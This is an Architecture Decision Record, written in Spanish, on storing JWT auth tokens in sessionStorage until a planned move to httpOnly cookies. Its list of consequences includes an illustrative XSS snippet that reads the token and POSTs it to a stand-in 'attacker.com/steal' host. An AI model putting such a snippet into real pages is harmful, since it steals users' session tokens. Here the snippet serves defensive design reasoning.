# ADR-003: sessionStorage para Autenticación (Solución Temporal)

**Fecha**: 12 de noviembre de 2025
**Estado**: Aceptado (Temporal - Migración Planeada)
**Decisores**: Equipo de desarrollo frontend
**Supersede por**: ADR-004 (Migración a httpOnly Cookies) - Planeado para v1.8.0

## Contexto y Problema

Necesitamos almacenar JWT tokens en el cliente para mantener sesiones de usuario. Requisitos:

- Persistencia mientras el usuario usa la aplicación
- Accesible desde JavaScript para incluir en headers `Authorization`
- Protección contra ataques comunes (XSS, CSRF)
- Experiencia de usuario fluida (sin re-login constante)

## Opciones Consideradas

1. **localStorage**: Persiste indefinidamente, compartido entre tabs
2. **sessionStorage**: Persiste solo durante la sesión, aislado por tab
3. **httpOnly Cookies**: Manejadas por el navegador, no accesibles desde JS
4. **Memory only (useState)**: Desaparece al refrescar página

## Decisión

**Adoptamos sessionStorage temporalmente** para almacenar JWT tokens:

```javascript
// src/utils/secureAuth.js
const TOKEN_KEY = 'auth_token';

export const setAuthToken = (token) => {
  sessionStorage.setItem(TOKEN_KEY, token);
};

export const getAuthToken = () => {
  return sessionStorage.getItem(TOKEN_KEY);
};
```

**⚠️ Esta es una solución temporal. Plan de migración a httpOnly cookies en v1.8.0**

## Justificación

### Por qué sessionStorage (vs localStorage):

| Aspecto | sessionStorage | localStorage |
|---------|---------------|--------------|
| **Persistencia** | Solo sesión de tab | Indefinida |
| **Compartir entre tabs** | ❌ No (aislado) | ✅ Sí |
| **Auto-cleanup** | ✅ Sí (cerrar tab) | ❌ No |
| **Vulnerabilidad XSS** | ⚠️ Alta | ⚠️ Alta |
| **Lifetime reducido** | ✅ Sí | ❌ No |

**sessionStorage es ligeramente más seguro** porque:
1. **Auto-cleanup**: Token desaparece al cerrar tab
2. **Aislamiento**: Un tab comprometido no afecta otros
3. **Lifetime corto**: Reduce ventana de ataque

### Por qué NO httpOnly Cookies (ahora):

**Requiere cambios en backend:**
- FastAPI debe enviar cookies en lugar de JSON response
- Middleware de auth debe leer cookies en lugar de headers
- Configuración CORS con `credentials: 'include'`

**Plan**: Migrar a httpOnly cookies en v1.8.0 (coordinado frontend + backend)

## Consecuencias

### Positivas:
- ✅ **Implementación rápida**: Sin cambios en backend
- ✅ **Auto-cleanup**: Token se borra al cerrar tab
- ✅ **Aislamiento**: No compartido entre tabs
- ✅ **Compatible**: Con autenticación actual de backend

### Negativas (Vulnerabilidades):
- ❌ **Vulnerable a XSS**: JavaScript puede robar el token
- ❌ **Sin protección CSRF**: Token accesible desde JavaScript
- ❌ **Requiere header manual**: `Authorization: Bearer ${token}`
- ❌ **No persiste**: Usuario debe re-login al cerrar tab

### Vulnerabilidad XSS Ejemplo:
```javascript
// Si un atacante inyecta este código:
const token = sessionStorage.getItem('auth_token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});
```

**Mitigaciones Actuales:**
1. **Content Security Policy (CSP)** en index.html
2. **React Auto-Escaping**: Previene XSS en JSX
3. **Input Validation**: Sanitización en formularios
4. **No dangerouslySetInnerHTML**: Evitado en toda la app

**Mitigación Planificada (v1.8.0):**
- Migración a httpOnly cookies (elimina acceso desde JavaScript)

## Validación

Criterios de éxito temporal:
- [x] Autenticación funcional (✅ Login/Register/Logout)
- [x] Token incluido en requests API (✅ Headers Authorization)
- [x] Auto-limpieza al cerrar tab (✅ sessionStorage nativo)
- [ ] Migración a httpOnly cookies (⏳ Planeado v1.8.0)

## Plan de Migración (v1.8.0)

### Backend Changes Required:
```python
# FastAPI - Set httpOnly cookie
@app.post("/api/v1/auth/login")
async def login(response: Response):
    token = create_access_token(user.id)
    response.set_cookie(
        key="access_token",
        value=token,
        httponly=True,  # ✅ No accesible desde JavaScript
        secure=True,    # ✅ Solo HTTPS
        samesite="lax", # ✅ Protección CSRF
        max_age=3600
    )
    return {"user": user_dto}  # NO enviar token en body
```

### Frontend Changes Required:
```javascript
// Eliminar setAuthToken/getAuthToken
// Usar fetch con credentials: 'include'
fetch(url, {
  credentials: 'include',  // Envía cookies automáticamente
  headers: {
    'Content-Type': 'application/json'
    // NO incluir Authorization header
  }
})
```

## Referencias

- [OWASP: JWT Storage Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Security: localStorage vs sessionStorage vs Cookies](https://stormpath.com/blog/where-to-store-your-jwts-cookies-vs-html5-web-storage)
- [SECURITY_MIGRATION.md](../../SECURITY_MIGRATION.md) - Guía de migración completa
- Backend ADR (futuro): Migración a httpOnly Cookies

## Notas de Implementación

### Implementado (v1.0.0 - v1.7.0):
- ✅ `src/utils/secureAuth.js` con helpers de sessionStorage
- ✅ Migración automática desde localStorage (usuarios antiguos)
- ✅ Validación de expiración de tokens (JWT decode)
- ✅ Cleanup al logout

### Archivos Afectados en Migración Futura:
- `src/utils/secureAuth.js` - Eliminar setAuthToken/getAuthToken
- `src/infrastructure/*/Api*Repository.js` - Agregar `credentials: 'include'`
- `src/pages/Login.jsx` - No guardar token manualmente
- `src/pages/Register.jsx` - No guardar token manualmente

## Relacionado

- ADR-004: Migración a httpOnly Cookies (planeado v1.8.0)
- ADR-005: Sentry para Error Tracking
- ROADMAP.md - Sección "Seguridad - Prioridad CRÍTICA"
